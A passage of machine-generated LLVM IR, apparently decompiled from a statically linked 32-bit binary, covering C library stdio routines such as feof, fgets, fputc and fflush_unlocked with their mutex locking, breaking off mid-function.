  uselistorder i32 %v1_805d369, { 1, 0 }
  uselistorder i32 %v0_805d387.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_805d34c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_805d343, { 1, 2, 0 }
  uselistorder i32 %v0_805d309, { 1, 0 }
  uselistorder i32 %v1_805d2fb, { 1, 0 }
  uselistorder i32 %v1_805d2f6, { 0, 1, 3, 2 }
  uselistorder i32 %v6_805d2f4, { 2, 0, 1 }
  uselistorder i32 %v0_805d316, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_805d2b1, { 1, 2, 0 }
  uselistorder i32 %v0_805d289, { 1, 2, 3, 6, 0, 4, 5, 7 }
  uselistorder i32 %v2_805d27f, { 1, 2, 0 }
  uselistorder i32 %v6_805d27d, { 0, 2, 1 }
  uselistorder i32 %v0_805d27c, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v1_805d275, { 1, 2, 3, 9, 7, 4, 5, 8, 6, 11, 12, 10, 0, 13 }
  uselistorder i32 %v3_805d275, { 2, 1, 0 }
  uselistorder i32 %v1_805d26d, { 1, 0 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v8_805d253, { 1, 0, 3, 2 }
  uselistorder i32 %v1_805d229, { 0, 2, 1 }
  uselistorder i32 %v0_805d216, { 2, 0, 1 }
  uselistorder i32 %v4_805d1b0, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 0, 20, 19, 18, 17, 16, 14, 13, 12, 1, 3, 15, 2, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 4, 3, 5, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 35, 31, 30, 32, 33, 36, 34, 42, 37, 38, 39, 40, 41, 43, 44 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -9, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 3840, { 2, 3, 4, 0, 1 }
  uselistorder i32 -5, { 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 -134666559, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_806d949.657 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805d574, { 1, 0 }
  uselistorder label %dec_label_pc_805d571, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_805d565, { 1, 0 }
  uselistorder label %dec_label_pc_805d53a, { 1, 0 }
  uselistorder label %dec_label_pc_805d4ff, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805d4a3, { 1, 0 }
  uselistorder label %dec_label_pc_805d477, { 1, 0 }
  uselistorder label %dec_label_pc_805d3df, { 1, 0 }
  uselistorder label %dec_label_pc_805d3ab, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805d382, { 1, 0 }
  uselistorder label %dec_label_pc_805d359, { 1, 0 }
  uselistorder label %dec_label_pc_805d320, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_805d2c3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805d27d, { 1, 0 }
  uselistorder label %dec_label_pc_805d27c, { 1, 0 }
  uselistorder label %dec_label_pc_805d263, { 1, 0 }
  uselistorder label %dec_label_pc_805d24c, { 1, 0 }
  uselistorder label %dec_label_pc_805d24c.outer, { 2, 0, 1 }
}

define i32 @feof(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805d57c = load i32, i32* @edi, align 4
  %v0_805d57d = load i32, i32* @esi, align 4
  %v0_805d57e = load i32, i32* @ebx, align 4
  %v4_805d582 = ptrtoint i16* %arg1 to i32
  store i32 %v4_805d582, i32* @esi, align 4
  %v1_805d586 = add i32 %v4_805d582, 52
  %v2_805d586 = inttoptr i32 %v1_805d586 to i32*
  %v3_805d586 = load i32, i32* %v2_805d586, align 4
  store i32 %v3_805d586, i32* @edi, align 4
  %v1_805d589 = icmp eq i32 %v3_805d586, 0
  %v1_805d58b = icmp eq i1 %v1_805d589, false
  br i1 %v1_805d58b, label %dec_label_pc_805d5ac, label %dec_label_pc_805d58d

dec_label_pc_805d58d:                             ; preds = %entry
  %v1_805d58d = add i32 %v4_805d582, 56
  store i32 %v1_805d58d, i32* @ebx, align 4
  %v4_805d59c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134589241, i32 %v1_805d58d)
  %v0_805d5a1 = load i32, i32* @ebx, align 4
  %v1_805d5a4 = call i32 @pthread_mutex_lock(i32 %v0_805d5a1)
  %v0_805d5ae.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805d5ac

dec_label_pc_805d5ac:                             ; preds = %entry, %dec_label_pc_805d58d
  %v0_805d5ae = phi i32 [ %v4_805d582, %entry ], [ %v0_805d5ae.pre, %dec_label_pc_805d58d ]
  %v1_805d5ae = inttoptr i32 %v0_805d5ae to i16*
  %v2_805d5ae = load i16, i16* %v1_805d5ae, align 2
  %v3_805d5ae = zext i16 %v2_805d5ae to i32
  store i32 %v3_805d5ae, i32* @ebx, align 4
  br i1 %v1_805d58b, label %dec_label_pc_805d5c4, label %dec_label_pc_805d5b3

dec_label_pc_805d5b3:                             ; preds = %dec_label_pc_805d5ac
  %v3_805d5bc = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_805d5c7.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805d5c4

dec_label_pc_805d5c4:                             ; preds = %dec_label_pc_805d5ac, %dec_label_pc_805d5b3
  %v0_805d5c7 = phi i32 [ %v3_805d5ae, %dec_label_pc_805d5ac ], [ %v0_805d5c7.pre, %dec_label_pc_805d5b3 ]
  %v1_805d5c7 = and i32 %v0_805d5c7, 4
  store i32 %v0_805d57e, i32* @ebx, align 4
  store i32 %v0_805d57d, i32* @esi, align 4
  store i32 %v0_805d57c, i32* @edi, align 4
  ret i32 %v1_805d5c7

; uselistorder directives
  uselistorder label %dec_label_pc_805d5c4, { 1, 0 }
  uselistorder label %dec_label_pc_805d5ac, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805d5d0 = load i32, i32* @edi, align 4
  %v0_805d5d1 = load i32, i32* @esi, align 4
  %v0_805d5d2 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_805d5da = add i32 %arg3, 52
  %v2_805d5da = inttoptr i32 %v1_805d5da to i32*
  %v3_805d5da = load i32, i32* %v2_805d5da, align 4
  store i32 %v3_805d5da, i32* @edi, align 4
  %v1_805d5dd = icmp eq i32 %v3_805d5da, 0
  %v1_805d5df = icmp eq i1 %v1_805d5dd, false
  br i1 %v1_805d5df, label %entry.dec_label_pc_805d600_crit_edge, label %dec_label_pc_805d5e1

entry.dec_label_pc_805d600_crit_edge:             ; preds = %entry
  br label %dec_label_pc_805d600

dec_label_pc_805d5e1:                             ; preds = %entry
  %v1_805d5e1 = add i32 %arg3, 56
  store i32 %v1_805d5e1, i32* @ebx, align 4
  %v4_805d5f0 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134589241, i32 %v1_805d5e1)
  %v0_805d5f5 = load i32, i32* @ebx, align 4
  %v1_805d5f8 = call i32 @pthread_mutex_lock(i32 %v0_805d5f5)
  %v0_805d601.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805d600

dec_label_pc_805d600:                             ; preds = %entry.dec_label_pc_805d600_crit_edge, %dec_label_pc_805d5e1
  %v0_805d601 = phi i32 [ %arg3, %entry.dec_label_pc_805d600_crit_edge ], [ %v0_805d601.pre, %dec_label_pc_805d5e1 ]
  %v0_805d600 = load i32, i32* @edx, align 4
  %v4_805d60a = inttoptr i32 %arg1 to i8*
  %v5_805d60a = call i32 @__GI_fgets_unlocked(i8* %v4_805d60a, i32 %arg2, i32 %v0_805d601, i32 %v0_805d600)
  store i32 %v5_805d60a, i32* @ebx, align 4
  br i1 %v1_805d5df, label %dec_label_pc_805d629, label %dec_label_pc_805d618

dec_label_pc_805d618:                             ; preds = %dec_label_pc_805d600
  %v3_805d621 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_805d62c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805d629

dec_label_pc_805d629:                             ; preds = %dec_label_pc_805d600, %dec_label_pc_805d618
  %v0_805d62c = phi i32 [ %v5_805d60a, %dec_label_pc_805d600 ], [ %v0_805d62c.pre, %dec_label_pc_805d618 ]
  store i32 %v0_805d5d2, i32* @ebx, align 4
  store i32 %v0_805d5d1, i32* @esi, align 4
  store i32 %v0_805d5d0, i32* @edi, align 4
  ret i32 %v0_805d62c

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805d629, { 1, 0 }
  uselistorder label %dec_label_pc_805d600, { 1, 0 }
}

define i32 @__GI_fputc(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_805d634 = load i32, i32* @edi, align 4
  %v0_805d635 = load i32, i32* @esi, align 4
  %v0_805d636 = load i32, i32* @ebx, align 4
  %v12_805d637 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v4_805d63e = sext i8 %arg1 to i32
  store i32 %v4_805d63e, i32* @edi, align 4
  %v1_805d642 = add i32 %arg2, 52
  %v2_805d642 = inttoptr i32 %v1_805d642 to i32*
  %v3_805d642 = load i32, i32* %v2_805d642, align 4
  %v4_805d642 = icmp eq i32 %v3_805d642, 0
  br i1 %v4_805d642, label %dec_label_pc_805d66a, label %dec_label_pc_805d648

dec_label_pc_805d648:                             ; preds = %entry
  %v1_805d648 = add i32 %arg2, 16
  %v2_805d648 = inttoptr i32 %v1_805d648 to i32*
  %v3_805d648 = load i32, i32* %v2_805d648, align 4
  store i32 %v3_805d648, i32* %eax.global-to-local, align 4
  %v2_805d64b = add i32 %arg2, 28
  %v3_805d64b = inttoptr i32 %v2_805d64b to i32*
  %v4_805d64b = load i32, i32* %v3_805d64b, align 4
  %v10_805d64b = icmp ult i32 %v3_805d648, %v4_805d64b
  %v1_805d64e = icmp eq i1 %v10_805d64b, false
  br i1 %v1_805d64e, label %dec_label_pc_805d65d, label %dec_label_pc_805d650

dec_label_pc_805d650:                             ; preds = %dec_label_pc_805d648
  store i32 %v4_805d63e, i32* %edx.global-to-local, align 4
  %v3_805d652 = inttoptr i32 %v3_805d648 to i8*
  store i8 %arg1, i8* %v3_805d652, align 1
  %v0_805d654 = load i32, i32* %edx.global-to-local, align 4
  %v1_805d654 = urem i32 %v0_805d654, 256
  store i32 %v1_805d654, i32* @ebx, align 4
  %v0_805d657 = load i32, i32* %eax.global-to-local, align 4
  %v1_805d657 = add i32 %v0_805d657, 1
  store i32 %v1_805d657, i32* %eax.global-to-local, align 4
  %v1_805d658 = load i32, i32* @esi, align 4
  %v2_805d658 = add i32 %v1_805d658, 16
  %v3_805d658 = inttoptr i32 %v2_805d658 to i32*
  store i32 %v1_805d657, i32* %v3_805d658, align 4
  br label %dec_label_pc_805d6bd

dec_label_pc_805d65d:                             ; preds = %dec_label_pc_805d648
  %v4_805d661 = call i32 @putc_unlocked(i8 %arg1, i32 %arg2)
  store i32 %v4_805d661, i32* %eax.global-to-local, align 4
  store i32 %v4_805d661, i32* @ebx, align 4
  br label %dec_label_pc_805d6ba

dec_label_pc_805d66a:                             ; preds = %entry
  %v1_805d66a = add i32 %arg2, 56
  store i32 %v1_805d66a, i32* @ebx, align 4
  store i32 %v12_805d637, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v12_805d637, 16777216
  %v1_805d679 = sdiv i32 %sext, 16777216
  %v4_805d679 = inttoptr i32 %v1_805d679 to i32*
  %v5_805d679 = call i32 @__pthread_cleanup_push_defer(i32* %v4_805d679, i32 134589241, i32 %v1_805d66a)
  store i32 %v5_805d679, i32* %eax.global-to-local, align 4
  %v0_805d67e = load i32, i32* @ebx, align 4
  %sext2 = mul i32 %v0_805d67e, 16777216
  %v1_805d681 = sdiv i32 %sext2, 16777216
  %v2_805d681 = call i32 @pthread_mutex_lock(i32 %v1_805d681)
  store i32 %v2_805d681, i32* %eax.global-to-local, align 4
  %v0_805d686 = load i32, i32* @esi, align 4
  %v1_805d686 = add i32 %v0_805d686, 16
  %v2_805d686 = inttoptr i32 %v1_805d686 to i32*
  %v3_805d686 = load i32, i32* %v2_805d686, align 4
  store i32 %v3_805d686, i32* %eax.global-to-local, align 4
  %v2_805d68c = add i32 %v0_805d686, 28
  %v3_805d68c = inttoptr i32 %v2_805d68c to i32*
  %v4_805d68c = load i32, i32* %v3_805d68c, align 4
  %v10_805d68c = icmp ult i32 %v3_805d686, %v4_805d68c
  %v1_805d68f = icmp eq i1 %v10_805d68c, false
  %v0_805d6a1 = load i32, i32* @edi, align 4
  br i1 %v1_805d68f, label %dec_label_pc_805d69e, label %dec_label_pc_805d691

dec_label_pc_805d691:                             ; preds = %dec_label_pc_805d66a
  store i32 %v0_805d6a1, i32* %edx.global-to-local, align 4
  %v1_805d693 = trunc i32 %v0_805d6a1 to i8
  %v3_805d693 = inttoptr i32 %v3_805d686 to i8*
  store i8 %v1_805d693, i8* %v3_805d693, align 1
  %v0_805d695 = load i32, i32* %edx.global-to-local, align 4
  %v1_805d695 = urem i32 %v0_805d695, 256
  store i32 %v1_805d695, i32* @ebx, align 4
  %v0_805d698 = load i32, i32* %eax.global-to-local, align 4
  %v1_805d698 = add i32 %v0_805d698, 1
  store i32 %v1_805d698, i32* %eax.global-to-local, align 4
  %v1_805d699 = load i32, i32* @esi, align 4
  %v2_805d699 = add i32 %v1_805d699, 16
  %v3_805d699 = inttoptr i32 %v2_805d699 to i32*
  store i32 %v1_805d698, i32* %v3_805d699, align 4
  br label %dec_label_pc_805d6ac

dec_label_pc_805d69e:                             ; preds = %dec_label_pc_805d66a
  %v5_805d6a1 = trunc i32 %v0_805d6a1 to i8
  %v4_805d6a2 = call i32 @putc_unlocked(i8 %v5_805d6a1, i32 %v0_805d686)
  store i32 %v4_805d6a2, i32* %eax.global-to-local, align 4
  store i32 %v4_805d6a2, i32* @ebx, align 4
  br label %dec_label_pc_805d6ac

dec_label_pc_805d6ac:                             ; preds = %dec_label_pc_805d691, %dec_label_pc_805d69e
  store i32 %v12_805d637, i32* %eax.global-to-local, align 4
  %v4_805d6b5 = call i32 @__pthread_cleanup_pop_restore(i32* %v4_805d679, i32 1)
  store i32 %v4_805d6b5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d6ba

dec_label_pc_805d6ba:                             ; preds = %dec_label_pc_805d65d, %dec_label_pc_805d6ac
  br label %dec_label_pc_805d6bd

dec_label_pc_805d6bd:                             ; preds = %dec_label_pc_805d650, %dec_label_pc_805d6ba
  %v0_805d6c0 = load i32, i32* @ebx, align 4
  store i32 %v0_805d6c0, i32* %eax.global-to-local, align 4
  store i32 %v0_805d636, i32* @ebx, align 4
  store i32 %v0_805d635, i32* @esi, align 4
  store i32 %v0_805d634, i32* @edi, align 4
  ret i32 %v0_805d6c0

; uselistorder directives
  uselistorder i32 %v0_805d6a1, { 2, 1, 0 }
  uselistorder i32 %v12_805d637, { 1, 0, 2 }
  uselistorder i32 (i8, i32)* @putc_unlocked, { 6, 7, 0, 1, 2, 3, 4, 5, 8, 9 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_805d6bd, { 1, 0 }
  uselistorder label %dec_label_pc_805d6ba, { 1, 0 }
  uselistorder label %dec_label_pc_805d6ac, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v6_805d6dc = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134589241, i32 ptrtoint (i32* @global_var_8075418.635 to i32))
  %v2_805d6e8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075418.635 to i32))
  %v0_805d6ed = load i32, i32* @global_var_807bcdc.636, align 4
  %v8_805d6f5 = icmp eq i32 %v0_805d6ed, 1
  %v1_805d6f6 = icmp eq i1 %v8_805d6f5, false
  br i1 %v1_805d6f6, label %dec_label_pc_805d78d, label %dec_label_pc_805d6fc

dec_label_pc_805d6fc:                             ; preds = %entry
  %v0_805d6fc = load i32, i32* @global_var_807bce0.637, align 32
  %tmp30 = icmp slt i32 %v0_805d6fc, 1
  br i1 %tmp30, label %dec_label_pc_805d78d, label %dec_label_pc_805d709

dec_label_pc_805d709:                             ; preds = %dec_label_pc_805d6fc
  store i32 0, i32* @esi, align 4
  %v6_805d71b = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 134589241, i32 ptrtoint (i32* @global_var_8075400.646 to i32))
  %v2_805d727 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075400.646 to i32))
  %v0_805d72c = load i32, i32* bitcast (i32** @global_var_80753fc.617 to i32*), align 4
  store i32 %v0_805d72c, i32* %edx.global-to-local, align 4
  %v1_805d76e5 = icmp eq i32 %v0_805d72c, 0
  %v1_805d77012 = icmp eq i1 %v1_805d76e5, false
  br i1 %v1_805d77012, label %dec_label_pc_805d737, label %dec_label_pc_805d772

dec_label_pc_805d737:                             ; preds = %dec_label_pc_805d709, %dec_label_pc_805d76c
  %v1_805d73716.in = phi i32 [ %v0_805d76c, %dec_label_pc_805d76c ], [ %v0_805d72c, %dec_label_pc_805d709 ]
  %v1_805d73716 = inttoptr i32 %v1_805d73716.in to i16*
  %v2_805d737 = load i16, i16* %v1_805d73716, align 2
  %v1_805d73a = add i32 %v1_805d73716.in, 32
  %v2_805d73a = inttoptr i32 %v1_805d73a to i32*
  %v3_805d73a = load i32, i32* %v2_805d73a, align 4
  store i32 %v3_805d73a, i32* @ebx, align 4
  %v1_805d73d = and i16 %v2_805d737, -32720
  %v6_805d742 = icmp eq i16 %v1_805d73d, 48
  br i1 %v6_805d742, label %dec_label_pc_805d74b, label %dec_label_pc_805d747

dec_label_pc_805d747:                             ; preds = %dec_label_pc_805d737
  store i32 %v1_805d73716.in, i32* @esi, align 4
  br label %dec_label_pc_805d76c

dec_label_pc_805d74b:                             ; preds = %dec_label_pc_805d737
  %v0_805d74b = load i32, i32* @esi, align 4
  %v1_805d74b = icmp eq i32 %v0_805d74b, 0
  %v1_805d74d = icmp eq i1 %v1_805d74b, false
  br i1 %v1_805d74d, label %dec_label_pc_805d757, label %dec_label_pc_805d74f

dec_label_pc_805d74f:                             ; preds = %dec_label_pc_805d74b
  store i32 %v3_805d73a, i32* bitcast (i32** @global_var_80753fc.617 to i32*), align 4
  br label %dec_label_pc_805d75a

dec_label_pc_805d757:                             ; preds = %dec_label_pc_805d74b
  %v2_805d757 = add i32 %v0_805d74b, 32
  %v3_805d757 = inttoptr i32 %v2_805d757 to i32*
  store i32 %v3_805d73a, i32* %v3_805d757, align 4
  %v0_805d75a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805d75a

dec_label_pc_805d75a:                             ; preds = %dec_label_pc_805d74f, %dec_label_pc_805d757
  %v0_805d763 = phi i32 [ %v1_805d73716.in, %dec_label_pc_805d74f ], [ %v0_805d75a.pre, %dec_label_pc_805d757 ]
  %v1_805d75a = add i32 %v0_805d763, 1
  %v2_805d75a = inttoptr i32 %v1_805d75a to i8*
  %v3_805d75a = load i8, i8* %v2_805d75a, align 1
  %v4_805d75a = and i8 %v3_805d75a, 32
  %v5_805d75a = icmp eq i8 %v4_805d75a, 0
  br i1 %v5_805d75a, label %dec_label_pc_805d76c, label %dec_label_pc_805d760

dec_label_pc_805d760:                             ; preds = %dec_label_pc_805d75a
  %v2_805d764 = call i32 @free(i32 %v0_805d763)
  br label %dec_label_pc_805d76c

dec_label_pc_805d76c:                             ; preds = %dec_label_pc_805d75a, %dec_label_pc_805d747, %dec_label_pc_805d760
  %v0_805d76c = load i32, i32* @ebx, align 4
  store i32 %v0_805d76c, i32* %edx.global-to-local, align 4
  %v1_805d76e = icmp eq i32 %v0_805d76c, 0
  %v1_805d770 = icmp eq i1 %v1_805d76e, false
  br i1 %v1_805d770, label %dec_label_pc_805d737, label %dec_label_pc_805d772

dec_label_pc_805d772:                             ; preds = %dec_label_pc_805d76c, %dec_label_pc_805d709
  %v4_805d77b = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-40, i32 1)
  store i32 0, i32* @global_var_807bce0.637, align 32
  %v0_805d78d.pre = load i32, i32* @global_var_807bcdc.636, align 4
  br label %dec_label_pc_805d78d

dec_label_pc_805d78d:                             ; preds = %dec_label_pc_805d6fc, %entry, %dec_label_pc_805d772
  %v0_805d78d = phi i32 [ %v0_805d6ed, %dec_label_pc_805d6fc ], [ %v0_805d6ed, %entry ], [ %v0_805d78d.pre, %dec_label_pc_805d772 ]
  %v1_805d792 = add i32 %v0_805d78d, -1
  store i32 %v1_805d792, i32* @global_var_807bcdc.636, align 4
  %v4_805d7a1 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  ret i32 %v4_805d7a1

; uselistorder directives
  uselistorder i32 %v0_805d76c, { 1, 2, 0 }
  uselistorder i32 %v1_805d73716.in, { 2, 1, 0, 3 }
  uselistorder i32 %v0_805d6ed, { 1, 2, 0 }
  uselistorder i32* bitcast (i32** @global_var_80753fc.617 to i32*), { 4, 5, 0, 1, 6, 7, 2, 3 }
  uselistorder label %dec_label_pc_805d78d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805d76c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805d75a, { 1, 0 }
  uselistorder label %dec_label_pc_805d737, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_805d7ac = load i32, i32* @ebp, align 4
  store i32 0, i32* @ebp, align 4
  %v0_805d7af = load i32, i32* @edi, align 4
  %v0_805d7b0 = load i32, i32* @esi, align 4
  %v0_805d7b1 = load i32, i32* @ebx, align 4
  %v4_805d7b5 = ptrtoint i16* %arg1 to i32
  store i32 %v4_805d7b5, i32* @ebx, align 4
  %v10_805d7b9 = icmp eq i16* %arg1, inttoptr (i32 134697980 to i16*)
  br i1 %v10_805d7b9, label %dec_label_pc_805d7cd, label %dec_label_pc_805d7c1

dec_label_pc_805d7c1:                             ; preds = %entry
  %v2_805d7c1 = icmp eq i16* %arg1, null
  store i32 256, i32* @ebp, align 4
  %v1_805d7c7 = icmp eq i1 %v2_805d7c1, false
  br i1 %v1_805d7c7, label %dec_label_pc_805d8c5, label %dec_label_pc_805d7cd

dec_label_pc_805d7cd:                             ; preds = %dec_label_pc_805d7c1, %entry
  store i32 0, i32* @edi, align 4
  %v2_805d7da = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805d7da, i32* @ebx, align 4
  %v5_805d7df = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134589241, i32 ptrtoint (i32* @global_var_8075418.635 to i32))
  %v2_805d7eb = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075418.635 to i32))
  %v0_805d7f0 = load i32, i32* @global_var_807bcdc.636, align 4
  store i32 ptrtoint (i32* @global_var_8075418.635 to i32), i32* @ecx, align 4
  %v1_805d7f7 = add i32 %v0_805d7f0, 1
  store i32 %v1_805d7f7, i32* @global_var_807bcdc.636, align 4
  %v4_805d800 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v5_805d813 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134589241, i32 ptrtoint (i32* @global_var_8075400.646 to i32))
  %v2_805d81f = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075400.646 to i32))
  %v4_805d82f = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v0_805d8b62 = load i32, i32* @esi, align 4
  %v1_805d8b63 = icmp eq i32 %v0_805d8b62, 0
  %v1_805d8b810 = icmp eq i1 %v1_805d8b63, false
  br i1 %v1_805d8b810, label %dec_label_pc_805d839, label %dec_label_pc_805d8be

dec_label_pc_805d839:                             ; preds = %dec_label_pc_805d7cd, %dec_label_pc_805d8b3
  %v0_805d847 = phi i32 [ %v3_805d8b3, %dec_label_pc_805d8b3 ], [ %v0_805d8b62, %dec_label_pc_805d7cd ]
  %v1_805d839 = inttoptr i32 %v0_805d847 to i8*
  %v2_805d839 = load i8, i8* %v1_805d839, align 1
  %v3_805d839 = and i8 %v2_805d839, 64
  %v4_805d839 = icmp eq i8 %v3_805d839, 0
  br i1 %v4_805d839, label %dec_label_pc_805d8b3, label %dec_label_pc_805d83e

dec_label_pc_805d83e:                             ; preds = %dec_label_pc_805d839
  %v0_805d83e = load i32, i32* @global_var_8075430.614, align 16
  %v9_805d83e = icmp eq i32 %v0_805d83e, 2
  br i1 %v9_805d83e, label %dec_label_pc_805d866, label %dec_label_pc_805d847

dec_label_pc_805d847:                             ; preds = %dec_label_pc_805d83e
  %v1_805d847 = add i32 %v0_805d847, 56
  store i32 %v1_805d847, i32* @ebx, align 4
  %v5_805d856 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134589241, i32 %v1_805d847)
  %v0_805d85b = load i32, i32* @ebx, align 4
  %v2_805d85e = call i32 @pthread_mutex_lock(i32 %v0_805d85b)
  %v0_805d866.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805d866

dec_label_pc_805d866:                             ; preds = %dec_label_pc_805d83e, %dec_label_pc_805d847
  %v0_805d879 = phi i32 [ %v0_805d847, %dec_label_pc_805d83e ], [ %v0_805d866.pre, %dec_label_pc_805d847 ]
  %v1_805d866 = inttoptr i32 %v0_805d879 to i32*
  %v2_805d866 = load i32, i32* %v1_805d866, align 4
  %v1_805d868 = load i32, i32* @ebp, align 4
  %v2_805d868 = or i32 %v1_805d868, %v2_805d866
  %v1_805d86a = and i32 %v2_805d868, 832
  %v2_805d86f = icmp eq i32 %v1_805d86a, 320
  %v1_805d874 = icmp eq i1 %v2_805d86f, false
  br i1 %v1_805d874, label %dec_label_pc_805d899, label %dec_label_pc_805d876

dec_label_pc_805d876:                             ; preds = %dec_label_pc_805d866
  %v2_805d87a = call i32 @__stdio_wcommit(i32 %v0_805d879)
  %v1_805d882 = icmp eq i32 %v2_805d87a, 0
  br i1 %v1_805d882, label %dec_label_pc_805d88b, label %dec_label_pc_805d886

dec_label_pc_805d886:                             ; preds = %dec_label_pc_805d876
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_805d899

dec_label_pc_805d88b:                             ; preds = %dec_label_pc_805d876
  %v0_805d88b = load i32, i32* @esi, align 4
  %v1_805d88b = add i32 %v0_805d88b, 8
  %v2_805d88b = inttoptr i32 %v1_805d88b to i32*
  %v3_805d88b = load i32, i32* %v2_805d88b, align 4
  %v2_805d88e = add i32 %v0_805d88b, 28
  %v3_805d88e = inttoptr i32 %v2_805d88e to i32*
  store i32 %v3_805d88b, i32* %v3_805d88e, align 4
  %v0_805d891 = load i32, i32* @esi, align 4
  %v1_805d891 = inttoptr i32 %v0_805d891 to i32*
  %v2_805d891 = load i32, i32* %v1_805d891, align 4
  %v2_805d891.tr = trunc i32 %v2_805d891 to i16
  %v1_805d896 = and i16 %v2_805d891.tr, -65
  %v3_805d896 = inttoptr i32 %v0_805d891 to i16*
  store i16 %v1_805d896, i16* %v3_805d896, align 2
  br label %dec_label_pc_805d899

dec_label_pc_805d899:                             ; preds = %dec_label_pc_805d866, %dec_label_pc_805d886, %dec_label_pc_805d88b
  %v0_805d899 = load i32, i32* @global_var_8075430.614, align 16
  %v9_805d899 = icmp eq i32 %v0_805d899, 2
  br i1 %v9_805d899, label %dec_label_pc_805d8b3, label %dec_label_pc_805d8a2

dec_label_pc_805d8a2:                             ; preds = %dec_label_pc_805d899
  %v4_805d8ab = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  br label %dec_label_pc_805d8b3

dec_label_pc_805d8b3:                             ; preds = %dec_label_pc_805d899, %dec_label_pc_805d839, %dec_label_pc_805d8a2
  %v0_805d8b3 = load i32, i32* @esi, align 4
  %v1_805d8b3 = add i32 %v0_805d8b3, 32
  %v2_805d8b3 = inttoptr i32 %v1_805d8b3 to i32*
  %v3_805d8b3 = load i32, i32* %v2_805d8b3, align 4
  store i32 %v3_805d8b3, i32* @esi, align 4
  %v1_805d8b6 = icmp eq i32 %v3_805d8b3, 0
